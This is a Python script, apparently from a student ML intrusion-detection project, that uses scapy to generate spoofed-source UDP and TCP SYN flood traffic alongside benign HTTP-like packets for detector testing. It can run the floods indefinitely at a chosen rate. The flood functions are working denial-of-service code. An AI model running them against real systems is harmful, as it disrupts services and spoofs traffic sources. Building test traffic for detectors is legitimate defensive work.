#!/usr/bin/env python3
"""
simulate_attack.py — Generate network traffic for ML-NIDS testing and demonstration

Usage examples:
  python detection-engine\simulate_attack.py udp_flood --target 192.168.1.10 --port 9999 --count 500 --rate 200
  python detection-engine\simulate_attack.py tcp_syn_flood --target 192.168.1.10 --port 80 --count 500 --rate 100
  python detection-engine\simulate_attack.py normal_traffic --target 192.168.1.10 --port 80 --count 200 --rate 50
  python detection-engine\simulate_attack.py mixed --target 192.168.1.10 --port 80 --count 500 --rate 100
"""

import argparse
import random
import time
import sys
from scapy.all import IP, UDP, TCP, send

# ---------- Colors ----------
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RESET = "\033[0m"

# ---------- Traffic Modes ----------
def udp_flood(target, port, count, rate, payload_size, infinite=False):
    """Simulate UDP Flood attack"""
    delay = 1.0 / rate if rate > 0 else 0
    print(f"{RED}[ATTACK] UDP Flood -> {target}:{port} count={count} rate={rate}/sec payload={payload_size}B{RESET}")

    i = 0
    while True:
        i += 1
        sport = random.randint(1025, 65535)
        payload = bytes(random.getrandbits(8) for _ in range(payload_size))
        pkt = IP(src=random_ip(), dst=target) / UDP(sport=sport, dport=port) / payload
        send(pkt, verbose=False)
        if delay:
            time.sleep(delay)
        if not infinite and i >= count:
            break


def tcp_syn_flood(target, port, count, rate, infinite=False):
    """Simulate TCP SYN Flood attack"""
    delay = 1.0 / rate if rate > 0 else 0
    print(f"{RED}[ATTACK] TCP SYN Flood -> {target}:{port} count={count} rate={rate}pps{RESET}")

    i = 0
    while True:
        i += 1
        sport = random.randint(1025, 65535)
        seq = random.randint(0, 2**32 - 1)
        pkt = IP(src=random_ip(), dst=target) / TCP(sport=sport, dport=port, flags="S", seq=seq)
        send(pkt, verbose=False)
        if delay:
            time.sleep(delay)
        if not infinite and i >= count:
            break


def normal_traffic(target, port, count, rate, infinite=False):
    """Simulate normal benign TCP traffic"""
    delay = 1.0 / rate if rate > 0 else 0
    print(f"{GREEN}[NORMAL] Benign traffic -> {target}:{port} count={count} rate={rate}pps{RESET}")

    i = 0
    while True:
        i += 1
        sport = random.randint(1025, 65535)
        payload = b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n"
        pkt = IP(src=random_ip(), dst=target) / TCP(sport=sport, dport=port, flags="PA") / payload
        send(pkt, verbose=False)
        if delay:
            time.sleep(delay)
        if not infinite and i >= count:
            break


def mixed_traffic(target, port, count, rate):
    """Alternate between benign and attack traffic"""
    print(f"{YELLOW}[MIXED] Alternating between benign and attack traffic{RESET}")
    for i in range(count):
        mode = random.choice(["benign", "attack"])
        if mode == "benign":
            normal_traffic(target, port, 1, rate)
        else:
            if random.choice([True, False]):
                udp_flood(target, port, 1, rate, 64)
            else:
                tcp_syn_flood(target, port, 1, rate)
        time.sleep(0.02)


# ---------- Utility ----------
def random_ip():
    """Generate pseudo-random spoofed IP address"""
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


def parse_args():
    p = argparse.ArgumentParser(description="Simulate attack/benign traffic for ML-NIDS demo")
    p.add_argument("mode", choices=["udp_flood", "tcp_syn_flood", "normal_traffic", "mixed"], help="Traffic type")
    p.add_argument("--target", required=True, help="Target IP address (your machine IP)")
    p.add_argument("--port", type=int, default=9999, help="Destination port")
    p.add_argument("--count", type=int, default=100, help="Number of packets to send (ignored if --infinite)")
    p.add_argument("--rate", type=int, default=50, help="Packets per second rate")
    p.add_argument("--payload", type=int, default=64, help="UDP payload size in bytes")
    p.add_argument("--infinite", action="store_true", help="Run indefinitely until Ctrl+C (for viva demo)")
    return p.parse_args()


def main():
    args = parse_args()

    # Safety limits
    if args.count > 100000 and not args.infinite:
        print(f"{YELLOW}[WARN] Very high count specified ({args.count}). Are you sure?{RESET}")
        time.sleep(1)

    if args.mode == "udp_flood":
        udp_flood(args.target, args.port, args.count, args.rate, args.payload, args.infinite)
    elif args.mode == "tcp_syn_flood":
        tcp_syn_flood(args.target, args.port, args.count, args.rate, args.infinite)
    elif args.mode == "normal_traffic":
        normal_traffic(args.target, args.port, args.count, args.rate, args.infinite)
    elif args.mode == "mixed":
        mixed_traffic(args.target, args.port, args.count, args.rate)


if __name__ == "__main__":
    main()